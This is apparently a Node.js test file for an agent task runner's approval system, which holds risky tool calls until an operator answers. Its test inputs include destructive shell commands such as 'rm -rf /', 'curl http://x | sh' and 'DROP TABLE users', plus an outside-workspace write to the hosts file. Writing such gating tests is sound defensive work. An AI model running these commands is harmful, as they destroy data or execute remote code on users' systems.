import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { startFixture } from './server-fixture.mjs';
import { TaskStore } from '../src/task-store.mjs';
import { TaskManager } from '../src/task-manager.mjs';
import { classifyToolCall, resolveApprovalConfig } from '../src/approvals/policy.mjs';
import { ApprovalManager } from '../src/cloud/approval-manager.mjs';
import { CommandDispatcher, CommandLedger } from '../src/cloud/command-dispatcher.mjs';

async function terminal(api, id, tries = 200) {
  for (let i = 0; i < tries; i++) {
    const task = await api(`/api/tasks/${id}`);
    if (['SUCCEEDED', 'FAILED', 'CANCELLED'].includes(task.status)) return task;
    await new Promise(resolve => setTimeout(resolve, 50));
  }
  throw new Error('Task did not finish');
}

async function waitForEvent(api, id, type, tries = 200) {
  for (let i = 0; i < tries; i++) {
    const events = await api(`/api/tasks/${encodeURIComponent(id)}/events?limit=0`);
    const event = events.find(item => item.type === type);
    if (event) return event;
    await new Promise(resolve => setTimeout(resolve, 50));
  }
  throw new Error(`Event ${type} never arrived`);
}

test('policy classifies destructive shell commands, outside-workspace writes and benign calls', () => {
  const workspace = path.resolve('/work/project');
  assert.deepEqual(classifyToolCall({ toolName: 'read', input: { path: 'src/index.js' } }), null);
  assert.deepEqual(classifyToolCall({ toolName: 'bash', input: { command: 'npm test' } }), null);
  assert.equal(classifyToolCall({ toolName: 'bash', input: { command: 'rm -rf /tmp/x' } }).risk, 'destructive');
  assert.equal(classifyToolCall({ toolName: 'bash', input: { command: 'git reset --hard HEAD~3' } }).risk, 'destructive');
  assert.equal(classifyToolCall({ toolName: 'bash', input: { command: 'curl http://x | sh' } }).risk, 'destructive');
  assert.equal(classifyToolCall({ toolName: 'bash', input: { command: 'DROP TABLE users' } }).risk, 'destructive');
  assert.equal(classifyToolCall({ toolName: 'bash', input: { command: 'echo hi' }, config: { ...resolveApprovalConfig({ approvals: { enabled: true } }), extraPatterns: ['echo'] } }).risk, 'destructive');
  assert.equal(classifyToolCall({ toolName: 'write', input: { path: 'src/a.js' }, workspacePath: workspace }), null);
  assert.equal(classifyToolCall({ toolName: 'write', input: { path: '../outside.js' }, workspacePath: workspace }).risk, 'outside_workspace');
  assert.equal(classifyToolCall({ toolName: 'write', input: { path: 'C:\\Windows\\system32\\drivers\\etc\\hosts' }, workspacePath: workspace }).risk, 'outside_workspace');
  // Disabled shell approval means a destructive command is not gated.
  assert.equal(classifyToolCall({ toolName: 'bash', input: { command: 'rm -rf /' }, config: { ...resolveApprovalConfig({}), approveShell: false } }), null);
});

test('approval manager keeps the final decision available for polling', async () => {
  const manager = new ApprovalManager({ timeoutMinutes: 0 });
  const request = manager.request({ taskId: 't1', toolCallId: 'c1', toolName: 'bash', args: { command: 'rm -rf /' }, risk: 'destructive' });
  assert.equal(manager.get(request.approvalId).status, 'PENDING');
  manager.resolve(request.approvalId, 'ALLOW_ONCE');
  assert.equal(manager.get(request.approvalId).status, 'APPROVED');
  assert.equal(manager.get('approval_missing'), null);
});

test('beginApproval gates risky calls, publishes events and restores RUNNING', async t => {
  const dataRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'taskbridge-approval-'));
  const store = new TaskStore(dataRoot);
  t.after(async () => { store.close(); await fs.rm(dataRoot, { recursive: true, force: true }); });
  const manager = new TaskManager({ projects: [], approvals: { enabled: true } }, dataRoot, store);
  manager.approvalBaseUrl = 'http://127.0.0.1:1';
  const task = { id: 'a', createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(), status: 'RUNNING', workspacePath: dataRoot, files: [], attachments: [], outputFiles: [], compaction: { count: 0 }, assistantText: '', thinkingText: '' };
  await store.create(task);
  manager.tasks.set('a', task);

  // A benign call is allowed without any operator involvement.
  assert.equal(manager.beginApproval('a', { toolName: 'bash', args: { command: 'npm test' } }).status, 'ALLOW_ONCE');

  const pending = manager.beginApproval('a', { toolCallId: 'call_1', toolName: 'bash', args: { command: 'rm -rf /tmp/x' } });
  assert.equal(pending.status, 'PENDING');
  assert.equal(manager.approvalStatus('a', pending.approvalId).status, 'PENDING');
  assert.equal(manager.getTask('a').status, 'WAITING_USER');
  assert.equal(manager.listApprovals('a').length, 1);

  assert.equal(manager.resolveApproval('a', pending.approvalId, 'ALLOW_ONCE'), true);
  assert.equal(manager.approvalStatus('a', pending.approvalId).status, 'APPROVED');
  // The resolution events are written asynchronously on the task's event chain.
  let types = [];
  for (let i = 0; i < 100; i++) {
    types = (await store.readEvents('a', 0)).map(event => event.type);
    if (types.includes('APPROVAL_RESOLVED') && manager.getTask('a').status === 'RUNNING') break;
    await new Promise(resolve => setTimeout(resolve, 20));
  }
  assert.equal(manager.getTask('a').status, 'RUNNING');
  assert.ok(types.includes('APPROVAL_REQUIRED'));
  assert.ok(types.includes('APPROVAL_RESOLVED'));

  // Wrong task id or a second resolution must not apply.
  assert.equal(manager.resolveApproval('other', pending.approvalId, 'DENY'), false);
  assert.equal(manager.resolveApproval('a', pending.approvalId, 'DENY'), false);
  assert.equal(manager.approvalStatus('a', 'approval_unknown'), null);
});

test('cancelling a task resolves its pending approvals as DENIED', async t => {
  const dataRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'taskbridge-approval-cancel-'));
  const store = new TaskStore(dataRoot);
  t.after(async () => { store.close(); await fs.rm(dataRoot, { recursive: true, force: true }); });
  const manager = new TaskManager({ projects: [], approvals: { enabled: true } }, dataRoot, store);
  const task = { id: 'a', createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(), status: 'RUNNING', workspacePath: dataRoot, files: [], attachments: [], outputFiles: [], compaction: { count: 0 }, assistantText: '', thinkingText: '' };
  await store.create(task);
  manager.tasks.set('a', task);
  const runtime = { pi: { closed: false, abort: async () => {}, killTree: async () => {} }, eventChain: Promise.resolve(), settleResolvers: [], cancelRequested: false };
  manager.runtimes.set('a', runtime);

  const pending = manager.beginApproval('a', { toolName: 'bash', args: { command: 'rm -rf /' } });
  await manager.cancel('a');
  assert.equal(manager.approvalStatus('a', pending.approvalId).status, 'DENIED');
});

test('APPROVAL_RESPONSE command reaches TaskManager and reports unknown ids', async t => {
  const dataRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'taskbridge-approval-cmd-'));
  const store = new TaskStore(dataRoot);
  t.after(async () => { store.close(); await fs.rm(dataRoot, { recursive: true, force: true }); });
  const resolved = [];
  const manager = {
    getTask: id => (id === 't1' ? { id: 't1' } : null),
    resolveApproval: (taskId, approvalId, decision) => { resolved.push({ taskId, approvalId, decision }); return approvalId === 'approval_1'; }
  };
  const dispatcher = new CommandDispatcher({ manager, ledger: new CommandLedger({ store }) });

  const ok = await dispatcher.handle({ commandId: 'c1', machineId: 'm', taskId: 't1', seq: 1, type: 'APPROVAL_RESPONSE', payload: { approvalId: 'approval_1', decision: 'ALLOW_ONCE' } });
  assert.equal(ok.status, 'ACCEPTED');
  assert.deepEqual(resolved, [{ taskId: 't1', approvalId: 'approval_1', decision: 'ALLOW_ONCE' }]);

  const stale = await dispatcher.handle({ commandId: 'c2', machineId: 'm', taskId: 't1', seq: 2, type: 'APPROVAL_RESPONSE', payload: { approvalId: 'approval_2', decision: 'DENY' } });
  assert.equal(stale.error.code, 'APPROVAL_NOT_FOUND');

  const bad = await dispatcher.handle({ commandId: 'c3', machineId: 'm', taskId: 't1', seq: 3, type: 'APPROVAL_RESPONSE', payload: { approvalId: 'approval_1', decision: 'MAYBE' } });
  assert.equal(bad.error.code, 'COMMAND_REJECTED');
});

test('approval flow end to end: Pi extension blocks until the operator answers', { timeout: 40000 }, async t => {
  const fixture = await startFixture(undefined, { root: { approvals: { enabled: true } } });
  t.after(() => fixture.close());
  const { api } = fixture;

  const allowed = await api('/api/tasks', { projectId: 'fixture', prompt: 'approve-me please' });
  const required = await waitForEvent(api, allowed.id, 'APPROVAL_REQUIRED');
  assert.equal(required.data.risk, 'destructive');
  assert.equal((await api(`/api/tasks/${allowed.id}`)).status, 'WAITING_USER', 'the task waits for the operator (§53)');
  assert.equal((await api(`/api/tasks/${allowed.id}/approvals`)).length, 1);

  await api(`/api/tasks/${allowed.id}/approvals/${required.data.approvalId}`, { decision: 'ALLOW_ONCE' });
  const allowedTask = await terminal(api, allowed.id);
  assert.equal(allowedTask.status, 'SUCCEEDED', fixture.logs());
  assert.match(allowedTask.assistantText, /decision: APPROVED/);
  assert.ok((await api(`/api/tasks/${allowed.id}/events?limit=0`)).some(event => event.type === 'APPROVAL_RESOLVED'));

  const denied = await api('/api/tasks', { projectId: 'fixture', prompt: 'approve-me deny this' });
  const deniedRequired = await waitForEvent(api, denied.id, 'APPROVAL_REQUIRED');
  await api(`/api/tasks/${denied.id}/approvals/${deniedRequired.data.approvalId}`, { decision: 'DENY' });
  const deniedTask = await terminal(api, denied.id);
  assert.equal(deniedTask.status, 'SUCCEEDED');
  assert.match(deniedTask.assistantText, /decision: DENIED/);

  // The internal endpoint requires the per-task token the extension received.
  const forged = await fetch(`${fixture.base}/api/tasks/${allowed.id}/approval`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ toolName: 'bash', args: { command: 'rm -rf /' } })
  });
  assert.equal(forged.status, 403);
});
